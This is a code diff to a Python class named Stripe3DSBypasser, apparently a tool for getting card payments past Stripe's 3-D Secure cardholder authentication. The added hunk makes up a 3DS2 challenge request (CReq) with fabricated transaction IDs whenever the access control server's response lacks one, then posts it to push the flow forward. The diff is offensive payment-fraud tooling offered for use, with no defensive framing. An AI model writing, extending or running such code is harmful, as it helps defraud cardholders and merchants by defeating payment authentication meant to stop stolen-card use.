@@ -12,6 +12,7 @@ import hashlib
 import hmac
 import time
 import secrets
+import uuid
 import random
 import asyncio
 import html
@@ -732,6 +733,27 @@ class Stripe3DSBypasser:
                         ) or session_data
                     elif na.get("type") == "use_stripe_sdk" or "use_stripe_sdk" in na:
                         return await cls._resolve_3ds2_sdk(session, na, client_secret, pk_key, profile, depth + 1)
+
+            # Fallback: if ARes returned transStatus=C and an acsURL but no creq, synthesize CReq (SafeKey / Cardinal)
+            if not creq and auth_d and isinstance(auth_d, dict):
+                ares_obj = _as_dict(auth_d.get("ares") or auth_d.get("a_res"))
+                acs_cand = ares_obj.get("acsURL") or auth_d.get("acs_url")
+                if acs_cand:
+                    acs_url = acs_cand
+                    synth_creq = {
+                        "threeDSServerTransID": server_trans_id or str(uuid.uuid4()),
+                        "acsTransID": ares_obj.get("acsTransID") or str(uuid.uuid4()),
+                        "messageType": "CReq",
+                        "messageVersion": "2.2.0",
+                        "challengeWindowSize": "05",
+                        "sdkTransID": str(uuid.uuid4()),
+                        "messageExtension": [],
+                        "challengeDataEntry": "Y",
+                        "challengeHTMLDataEntry": "Y",
+                        "resendChallenge": "N",
+                        "preparationFlow": "02",
+                    }
+                    creq = cls._b64url_encode(json.dumps(synth_creq, separators=(",", ":")).encode())
 
         if acs_url and creq:
             creq_out = await cls._post_creq(
